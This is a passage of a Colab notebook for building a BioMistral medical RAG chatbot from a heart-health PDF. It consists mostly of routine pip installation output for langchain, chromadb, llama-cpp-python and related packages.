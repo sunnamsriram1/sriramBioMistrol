{
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/sunnamsriram1/sriramBioMistrol/blob/main/sriramBioAIMistral_chatbot.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "J177jX51J1Li"
      },
      "source": [
        "# Build BioMistral Medical RAG Chatbot using BioMistral Open Source LLM\n",
        "\n",
        "In the notebook we will build a Medical Chatbot with BioMistral LLM and Heart Health pdf file."
      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Syag3oIcKHM0"
      },
      "source": [
        "## Installation"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "L18fYAOPJzZX",
        "outputId": "c2de15ec-5362-4cba-d080-13f4f893e198"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Collecting langchain\n",
            "  Downloading langchain-0.3.0-py3-none-any.whl.metadata (7.1 kB)\n",
            "Collecting sentence-transformers\n",
            "  Downloading sentence_transformers-3.1.0-py3-none-any.whl.metadata (23 kB)\n",
            "Collecting chromadb\n",
            "  Downloading chromadb-0.5.5-py3-none-any.whl.metadata (6.8 kB)\n",
            "Collecting llama-cpp-python\n",
            "  Downloading llama_cpp_python-0.2.90.tar.gz (63.8 MB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m63.8/63.8 MB\u001b[0m \u001b[31m12.1 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25h  Installing build dependencies ... \u001b[?25l\u001b[?25hdone\n",
            "  Getting requirements to build wheel ... \u001b[?25l\u001b[?25hdone\n",
            "  Installing backend dependencies ... \u001b[?25l\u001b[?25hdone\n",
            "  Preparing metadata (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "Collecting langchain_community\n",
            "  Downloading langchain_community-0.3.0-py3-none-any.whl.metadata (2.8 kB)\n",
            "Collecting pypdf\n",
            "  Downloading pypdf-5.0.0-py3-none-any.whl.metadata (7.4 kB)\n",
            "Requirement already satisfied: PyYAML>=5.3 in /usr/local/lib/python3.10/dist-packages (from langchain) (6.0.2)\n",
            "Requirement already satisfied: SQLAlchemy<3,>=1.4 in /usr/local/lib/python3.10/dist-packages (from langchain) (2.0.34)\n",
            "Requirement already satisfied: aiohttp<4.0.0,>=3.8.3 in /usr/local/lib/python3.10/dist-packages (from langchain) (3.10.5)\n",
            "Requirement already satisfied: async-timeout<5.0.0,>=4.0.0 in /usr/local/lib/python3.10/dist-packages (from langchain) (4.0.3)\n",
            "Collecting langchain-core<0.4.0,>=0.3.0 (from langchain)\n",
            "  Downloading langchain_core-0.3.1-py3-none-any.whl.metadata (6.2 kB)\n",
            "Collecting langchain-text-splitters<0.4.0,>=0.3.0 (from langchain)\n",
            "  Downloading langchain_text_splitters-0.3.0-py3-none-any.whl.metadata (2.3 kB)\n",
            "Collecting langsmith<0.2.0,>=0.1.17 (from langchain)\n",
            "  Downloading langsmith-0.1.121-py3-none-any.whl.metadata (13 kB)\n",
            "Requirement already satisfied: numpy<2,>=1 in /usr/local/lib/python3.10/dist-packages (from langchain) (1.26.4)\n",
            "Requirement already satisfied: pydantic<3.0.0,>=2.7.4 in /usr/local/lib/python3.10/dist-packages (from langchain) (2.9.1)\n",
            "Requirement already satisfied: requests<3,>=2 in /usr/local/lib/python3.10/dist-packages (from langchain) (2.32.3)\n",
            "Collecting tenacity!=8.4.0,<9.0.0,>=8.1.0 (from langchain)\n",
            "  Downloading tenacity-8.5.0-py3-none-any.whl.metadata (1.2 kB)\n",
            "Requirement already satisfied: transformers<5.0.0,>=4.38.0 in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (4.44.2)\n",
            "Requirement already satisfied: tqdm in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (4.66.5)\n",
            "Requirement already satisfied: torch>=1.11.0 in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (2.4.0+cu121)\n",
            "Requirement already satisfied: scikit-learn in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (1.3.2)\n",
            "Requirement already satisfied: scipy in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (1.13.1)\n",
            "Requirement already satisfied: huggingface-hub>=0.19.3 in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (0.24.7)\n",
            "Requirement already satisfied: Pillow in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (9.4.0)\n",
            "Requirement already satisfied: build>=1.0.3 in /usr/local/lib/python3.10/dist-packages (from chromadb) (1.2.2)\n",
            "Collecting chroma-hnswlib==0.7.6 (from chromadb)\n",
            "  Downloading chroma_hnswlib-0.7.6-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (252 bytes)\n",
            "Collecting fastapi>=0.95.2 (from chromadb)\n",
            "  Downloading fastapi-0.115.0-py3-none-any.whl.metadata (27 kB)\n",
            "Collecting uvicorn>=0.18.3 (from uvicorn[standard]>=0.18.3->chromadb)\n",
            "  Downloading uvicorn-0.30.6-py3-none-any.whl.metadata (6.6 kB)\n",
            "Collecting posthog>=2.4.0 (from chromadb)\n",
            "  Downloading posthog-3.6.6-py2.py3-none-any.whl.metadata (2.0 kB)\n",
            "Requirement already satisfied: typing-extensions>=4.5.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (4.12.2)\n",
            "Collecting onnxruntime>=1.14.1 (from chromadb)\n",
            "  Downloading onnxruntime-1.19.2-cp310-cp310-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl.metadata (4.5 kB)\n",
            "Collecting opentelemetry-api>=1.2.0 (from chromadb)\n",
            "  Downloading opentelemetry_api-1.27.0-py3-none-any.whl.metadata (1.4 kB)\n",
            "Collecting opentelemetry-exporter-otlp-proto-grpc>=1.2.0 (from chromadb)\n",
            "  Downloading opentelemetry_exporter_otlp_proto_grpc-1.27.0-py3-none-any.whl.metadata (2.3 kB)\n",
            "Collecting opentelemetry-instrumentation-fastapi>=0.41b0 (from chromadb)\n",
            "  Downloading opentelemetry_instrumentation_fastapi-0.48b0-py3-none-any.whl.metadata (2.1 kB)\n",
            "Collecting opentelemetry-sdk>=1.2.0 (from chromadb)\n",
            "  Downloading opentelemetry_sdk-1.27.0-py3-none-any.whl.metadata (1.5 kB)\n",
            "Requirement already satisfied: tokenizers>=0.13.2 in /usr/local/lib/python3.10/dist-packages (from chromadb) (0.19.1)\n",
            "Collecting pypika>=0.48.9 (from chromadb)\n",
            "  Downloading PyPika-0.48.9.tar.gz (67 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m67.3/67.3 kB\u001b[0m \u001b[31m6.4 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25h  Installing build dependencies ... \u001b[?25l\u001b[?25hdone\n",
            "  Getting requirements to build wheel ... \u001b[?25l\u001b[?25hdone\n",
            "  Preparing metadata (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "Collecting overrides>=7.3.1 (from chromadb)\n",
            "  Downloading overrides-7.7.0-py3-none-any.whl.metadata (5.8 kB)\n",
            "Requirement already satisfied: importlib-resources in /usr/local/lib/python3.10/dist-packages (from chromadb) (6.4.5)\n",
            "Requirement already satisfied: grpcio>=1.58.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (1.64.1)\n",
            "Collecting bcrypt>=4.0.1 (from chromadb)\n",
            "  Downloading bcrypt-4.2.0-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (9.6 kB)\n",
            "Requirement already satisfied: typer>=0.9.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (0.12.5)\n",
            "Collecting kubernetes>=28.1.0 (from chromadb)\n",
            "  Downloading kubernetes-30.1.0-py2.py3-none-any.whl.metadata (1.5 kB)\n",
            "Collecting mmh3>=4.0.1 (from chromadb)\n",
            "  Downloading mmh3-4.1.0-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (13 kB)\n",
            "Collecting orjson>=3.9.12 (from chromadb)\n",
            "  Downloading orjson-3.10.7-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (50 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m50.4/50.4 kB\u001b[0m \u001b[31m4.2 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hCollecting httpx>=0.27.0 (from chromadb)\n",
            "  Downloading httpx-0.27.2-py3-none-any.whl.metadata (7.1 kB)\n",
            "Collecting diskcache>=5.6.1 (from llama-cpp-python)\n",
            "  Downloading diskcache-5.6.3-py3-none-any.whl.metadata (20 kB)\n",
            "Requirement already satisfied: jinja2>=2.11.3 in /usr/local/lib/python3.10/dist-packages (from llama-cpp-python) (3.1.4)\n",
            "Collecting dataclasses-json<0.7,>=0.5.7 (from langchain_community)\n",
            "  Downloading dataclasses_json-0.6.7-py3-none-any.whl.metadata (25 kB)\n",
            "Collecting pydantic-settings<3.0.0,>=2.4.0 (from langchain_community)\n",
            "  Downloading pydantic_settings-2.5.2-py3-none-any.whl.metadata (3.5 kB)\n",
            "Requirement already satisfied: aiohappyeyeballs>=2.3.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (2.4.0)\n",
            "Requirement already satisfied: aiosignal>=1.1.2 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (1.3.1)\n",
            "Requirement already satisfied: attrs>=17.3.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (24.2.0)\n",
            "Requirement already satisfied: frozenlist>=1.1.1 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (1.4.1)\n",
            "Requirement already satisfied: multidict<7.0,>=4.5 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (6.1.0)\n",
            "Requirement already satisfied: yarl<2.0,>=1.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (1.11.1)\n",
            "Requirement already satisfied: packaging>=19.1 in /usr/local/lib/python3.10/dist-packages (from build>=1.0.3->chromadb) (24.1)\n",
            "Requirement already satisfied: pyproject_hooks in /usr/local/lib/python3.10/dist-packages (from build>=1.0.3->chromadb) (1.1.0)\n",
            "Requirement already satisfied: tomli>=1.1.0 in /usr/local/lib/python3.10/dist-packages (from build>=1.0.3->chromadb) (2.0.1)\n",
            "Collecting marshmallow<4.0.0,>=3.18.0 (from dataclasses-json<0.7,>=0.5.7->langchain_community)\n",
            "  Downloading marshmallow-3.22.0-py3-none-any.whl.metadata (7.2 kB)\n",
            "Collecting typing-inspect<1,>=0.4.0 (from dataclasses-json<0.7,>=0.5.7->langchain_community)\n",
            "  Downloading typing_inspect-0.9.0-py3-none-any.whl.metadata (1.5 kB)\n",
            "Collecting starlette<0.39.0,>=0.37.2 (from fastapi>=0.95.2->chromadb)\n",
            "  Downloading starlette-0.38.5-py3-none-any.whl.metadata (6.0 kB)\n",
            "Requirement already satisfied: anyio in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (3.7.1)\n",
            "Requirement already satisfied: certifi in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (2024.8.30)\n",
            "Collecting httpcore==1.* (from httpx>=0.27.0->chromadb)\n",
            "  Downloading httpcore-1.0.5-py3-none-any.whl.metadata (20 kB)\n",
            "Requirement already satisfied: idna in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (3.8)\n",
            "Requirement already satisfied: sniffio in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (1.3.1)\n",
            "Collecting h11<0.15,>=0.13 (from httpcore==1.*->httpx>=0.27.0->chromadb)\n",
            "  Downloading h11-0.14.0-py3-none-any.whl.metadata (8.2 kB)\n",
            "Requirement already satisfied: filelock in /usr/local/lib/python3.10/dist-packages (from huggingface-hub>=0.19.3->sentence-transformers) (3.16.0)\n",
            "Requirement already satisfied: fsspec>=2023.5.0 in /usr/local/lib/python3.10/dist-packages (from huggingface-hub>=0.19.3->sentence-transformers) (2024.6.1)\n",
            "Requirement already satisfied: MarkupSafe>=2.0 in /usr/local/lib/python3.10/dist-packages (from jinja2>=2.11.3->llama-cpp-python) (2.1.5)\n",
            "Requirement already satisfied: six>=1.9.0 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (1.16.0)\n",
            "Requirement already satisfied: python-dateutil>=2.5.3 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (2.8.2)\n",
            "Requirement already satisfied: google-auth>=1.0.1 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (2.27.0)\n",
            "Requirement already satisfied: websocket-client!=0.40.0,!=0.41.*,!=0.42.*,>=0.32.0 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (1.8.0)\n",
            "Requirement already satisfied: requests-oauthlib in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (1.3.1)\n",
            "Requirement already satisfied: oauthlib>=3.2.2 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (3.2.2)\n",
            "Requirement already satisfied: urllib3>=1.24.2 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (2.0.7)\n",
            "Collecting jsonpatch<2.0,>=1.33 (from langchain-core<0.4.0,>=0.3.0->langchain)\n",
            "  Downloading jsonpatch-1.33-py2.py3-none-any.whl.metadata (3.0 kB)\n",
            "Collecting coloredlogs (from onnxruntime>=1.14.1->chromadb)\n",
            "  Downloading coloredlogs-15.0.1-py2.py3-none-any.whl.metadata (12 kB)\n",
            "Requirement already satisfied: flatbuffers in /usr/local/lib/python3.10/dist-packages (from onnxruntime>=1.14.1->chromadb) (24.3.25)\n",
            "Requirement already satisfied: protobuf in /usr/local/lib/python3.10/dist-packages (from onnxruntime>=1.14.1->chromadb) (3.20.3)\n",
            "Requirement already satisfied: sympy in /usr/local/lib/python3.10/dist-packages (from onnxruntime>=1.14.1->chromadb) (1.13.2)\n",
            "Collecting deprecated>=1.2.6 (from opentelemetry-api>=1.2.0->chromadb)\n",
            "  Downloading Deprecated-1.2.14-py2.py3-none-any.whl.metadata (5.4 kB)\n",
            "Collecting importlib-metadata<=8.4.0,>=6.0 (from opentelemetry-api>=1.2.0->chromadb)\n",
            "  Downloading importlib_metadata-8.4.0-py3-none-any.whl.metadata (4.7 kB)\n",
            "Requirement already satisfied: googleapis-common-protos~=1.52 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-exporter-otlp-proto-grpc>=1.2.0->chromadb) (1.65.0)\n",
            "Collecting opentelemetry-exporter-otlp-proto-common==1.27.0 (from opentelemetry-exporter-otlp-proto-grpc>=1.2.0->chromadb)\n",
            "  Downloading opentelemetry_exporter_otlp_proto_common-1.27.0-py3-none-any.whl.metadata (1.8 kB)\n",
            "Collecting opentelemetry-proto==1.27.0 (from opentelemetry-exporter-otlp-proto-grpc>=1.2.0->chromadb)\n",
            "  Downloading opentelemetry_proto-1.27.0-py3-none-any.whl.metadata (2.3 kB)\n",
            "Collecting opentelemetry-instrumentation-asgi==0.48b0 (from opentelemetry-instrumentation-fastapi>=0.41b0->chromadb)\n",
            "  Downloading opentelemetry_instrumentation_asgi-0.48b0-py3-none-any.whl.metadata (2.0 kB)\n",
            "Collecting opentelemetry-instrumentation==0.48b0 (from opentelemetry-instrumentation-fastapi>=0.41b0->chromadb)\n",
            "  Downloading opentelemetry_instrumentation-0.48b0-py3-none-any.whl.metadata (6.1 kB)\n",
            "Collecting opentelemetry-semantic-conventions==0.48b0 (from opentelemetry-instrumentation-fastapi>=0.41b0->chromadb)\n",
            "  Downloading opentelemetry_semantic_conventions-0.48b0-py3-none-any.whl.metadata (2.4 kB)\n",
            "Collecting opentelemetry-util-http==0.48b0 (from opentelemetry-instrumentation-fastapi>=0.41b0->chromadb)\n",
            "  Downloading opentelemetry_util_http-0.48b0-py3-none-any.whl.metadata (2.5 kB)\n",
            "Requirement already satisfied: setuptools>=16.0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-instrumentation==0.48b0->opentelemetry-instrumentation-fastapi>=0.41b0->chromadb) (71.0.4)\n",
            "Requirement already satisfied: wrapt<2.0.0,>=1.0.0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-instrumentation==0.48b0->opentelemetry-instrumentation-fastapi>=0.41b0->chromadb) (1.16.0)\n",
            "Collecting asgiref~=3.0 (from opentelemetry-instrumentation-asgi==0.48b0->opentelemetry-instrumentation-fastapi>=0.41b0->chromadb)\n",
            "  Downloading asgiref-3.8.1-py3-none-any.whl.metadata (9.3 kB)\n",
            "Collecting monotonic>=1.5 (from posthog>=2.4.0->chromadb)\n",
            "  Downloading monotonic-1.6-py2.py3-none-any.whl.metadata (1.5 kB)\n",
            "Collecting backoff>=1.10.0 (from posthog>=2.4.0->chromadb)\n",
            "  Downloading backoff-2.2.1-py3-none-any.whl.metadata (14 kB)\n",
            "Requirement already satisfied: annotated-types>=0.6.0 in /usr/local/lib/python3.10/dist-packages (from pydantic<3.0.0,>=2.7.4->langchain) (0.7.0)\n",
            "Requirement already satisfied: pydantic-core==2.23.3 in /usr/local/lib/python3.10/dist-packages (from pydantic<3.0.0,>=2.7.4->langchain) (2.23.3)\n",
            "Collecting python-dotenv>=0.21.0 (from pydantic-settings<3.0.0,>=2.4.0->langchain_community)\n",
            "  Downloading python_dotenv-1.0.1-py3-none-any.whl.metadata (23 kB)\n",
            "Requirement already satisfied: charset-normalizer<4,>=2 in /usr/local/lib/python3.10/dist-packages (from requests<3,>=2->langchain) (3.3.2)\n",
            "Requirement already satisfied: greenlet!=0.4.17 in /usr/local/lib/python3.10/dist-packages (from SQLAlchemy<3,>=1.4->langchain) (3.1.0)\n",
            "Requirement already satisfied: networkx in /usr/local/lib/python3.10/dist-packages (from torch>=1.11.0->sentence-transformers) (3.3)\n",
            "Requirement already satisfied: regex!=2019.12.17 in /usr/local/lib/python3.10/dist-packages (from transformers<5.0.0,>=4.38.0->sentence-transformers) (2024.5.15)\n",
            "Requirement already satisfied: safetensors>=0.4.1 in /usr/local/lib/python3.10/dist-packages (from transformers<5.0.0,>=4.38.0->sentence-transformers) (0.4.5)\n",
            "Requirement already satisfied: click>=8.0.0 in /usr/local/lib/python3.10/dist-packages (from typer>=0.9.0->chromadb) (8.1.7)\n",
            "Requirement already satisfied: shellingham>=1.3.0 in /usr/local/lib/python3.10/dist-packages (from typer>=0.9.0->chromadb) (1.5.4)\n",
            "Requirement already satisfied: rich>=10.11.0 in /usr/local/lib/python3.10/dist-packages (from typer>=0.9.0->chromadb) (13.8.1)\n",
            "Collecting httptools>=0.5.0 (from uvicorn[standard]>=0.18.3->chromadb)\n",
            "  Downloading httptools-0.6.1-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.6 kB)\n",
            "Collecting uvloop!=0.15.0,!=0.15.1,>=0.14.0 (from uvicorn[standard]>=0.18.3->chromadb)\n",
            "  Downloading uvloop-0.20.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.9 kB)\n",
            "Collecting watchfiles>=0.13 (from uvicorn[standard]>=0.18.3->chromadb)\n",
            "  Downloading watchfiles-0.24.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.9 kB)\n",
            "Collecting websockets>=10.4 (from uvicorn[standard]>=0.18.3->chromadb)\n",
            "  Downloading websockets-13.0.1-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (6.7 kB)\n",
            "Requirement already satisfied: joblib>=1.1.1 in /usr/local/lib/python3.10/dist-packages (from scikit-learn->sentence-transformers) (1.4.2)\n",
            "Requirement already satisfied: threadpoolctl>=2.0.0 in /usr/local/lib/python3.10/dist-packages (from scikit-learn->sentence-transformers) (3.5.0)\n",
            "Requirement already satisfied: cachetools<6.0,>=2.0.0 in /usr/local/lib/python3.10/dist-packages (from google-auth>=1.0.1->kubernetes>=28.1.0->chromadb) (5.5.0)\n",
            "Requirement already satisfied: pyasn1-modules>=0.2.1 in /usr/local/lib/python3.10/dist-packages (from google-auth>=1.0.1->kubernetes>=28.1.0->chromadb) (0.4.1)\n",
            "Requirement already satisfied: rsa<5,>=3.1.4 in /usr/local/lib/python3.10/dist-packages (from google-auth>=1.0.1->kubernetes>=28.1.0->chromadb) (4.9)\n",
            "Requirement already satisfied: zipp>=0.5 in /usr/local/lib/python3.10/dist-packages (from importlib-metadata<=8.4.0,>=6.0->opentelemetry-api>=1.2.0->chromadb) (3.20.2)\n",
            "Collecting jsonpointer>=1.9 (from jsonpatch<2.0,>=1.33->langchain-core<0.4.0,>=0.3.0->langchain)\n",
            "  Downloading jsonpointer-3.0.0-py2.py3-none-any.whl.metadata (2.3 kB)\n",
            "Requirement already satisfied: markdown-it-py>=2.2.0 in /usr/local/lib/python3.10/dist-packages (from rich>=10.11.0->typer>=0.9.0->chromadb) (3.0.0)\n",
            "Requirement already satisfied: pygments<3.0.0,>=2.13.0 in /usr/local/lib/python3.10/dist-packages (from rich>=10.11.0->typer>=0.9.0->chromadb) (2.16.1)\n",
            "Requirement already satisfied: exceptiongroup in /usr/local/lib/python3.10/dist-packages (from anyio->httpx>=0.27.0->chromadb) (1.2.2)\n",
            "Collecting mypy-extensions>=0.3.0 (from typing-inspect<1,>=0.4.0->dataclasses-json<0.7,>=0.5.7->langchain_community)\n",
            "  Downloading mypy_extensions-1.0.0-py3-none-any.whl.metadata (1.1 kB)\n",
            "Collecting humanfriendly>=9.1 (from coloredlogs->onnxruntime>=1.14.1->chromadb)\n",
            "  Downloading humanfriendly-10.0-py2.py3-none-any.whl.metadata (9.2 kB)\n",
            "Requirement already satisfied: mpmath<1.4,>=1.1.0 in /usr/local/lib/python3.10/dist-packages (from sympy->onnxruntime>=1.14.1->chromadb) (1.3.0)\n",
            "Requirement already satisfied: mdurl~=0.1 in /usr/local/lib/python3.10/dist-packages (from markdown-it-py>=2.2.0->rich>=10.11.0->typer>=0.9.0->chromadb) (0.1.2)\n",
            "Requirement already satisfied: pyasn1<0.7.0,>=0.4.6 in /usr/local/lib/python3.10/dist-packages (from pyasn1-modules>=0.2.1->google-auth>=1.0.1->kubernetes>=28.1.0->chromadb) (0.6.1)\n",
            "Downloading langchain-0.3.0-py3-none-any.whl (1.0 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m1.0/1.0 MB\u001b[0m \u001b[31m60.7 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading sentence_transformers-3.1.0-py3-none-any.whl (249 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m249.1/249.1 kB\u001b[0m \u001b[31m25.3 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading chromadb-0.5.5-py3-none-any.whl (584 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m584.3/584.3 kB\u001b[0m \u001b[31m8.1 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading chroma_hnswlib-0.7.6-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.4 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m2.4/2.4 MB\u001b[0m \u001b[31m94.8 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading langchain_community-0.3.0-py3-none-any.whl (2.3 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m2.3/2.3 MB\u001b[0m \u001b[31m79.3 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading pypdf-5.0.0-py3-none-any.whl (292 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m292.8/292.8 kB\u001b[0m \u001b[31m26.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading bcrypt-4.2.0-cp39-abi3-manylinux_2_28_x86_64.whl (273 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m273.8/273.8 kB\u001b[0m \u001b[31m26.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading dataclasses_json-0.6.7-py3-none-any.whl (28 kB)\n",
            "Downloading diskcache-5.6.3-py3-none-any.whl (45 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m45.5/45.5 kB\u001b[0m \u001b[31m4.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading fastapi-0.115.0-py3-none-any.whl (94 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m94.6/94.6 kB\u001b[0m \u001b[31m11.3 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading httpx-0.27.2-py3-none-any.whl (76 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m76.4/76.4 kB\u001b[0m \u001b[31m8.7 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading httpcore-1.0.5-py3-none-any.whl (77 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m77.9/77.9 kB\u001b[0m \u001b[31m8.2 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading kubernetes-30.1.0-py2.py3-none-any.whl (1.7 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m1.7/1.7 MB\u001b[0m \u001b[31m81.2 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading langchain_core-0.3.1-py3-none-any.whl (405 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m405.1/405.1 kB\u001b[0m \u001b[31m35.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading langchain_text_splitters-0.3.0-py3-none-any.whl (25 kB)\n",
            "Downloading langsmith-0.1.121-py3-none-any.whl (289 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m289.9/289.9 kB\u001b[0m \u001b[31m28.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading mmh3-4.1.0-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (67 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m67.6/67.6 kB\u001b[0m \u001b[31m7.2 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading onnxruntime-1.19.2-cp310-cp310-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl (13.2 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m13.2/13.2 MB\u001b[0m \u001b[31m116.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading opentelemetry_api-1.27.0-py3-none-any.whl (63 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m64.0/64.0 kB\u001b[0m \u001b[31m6.8 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
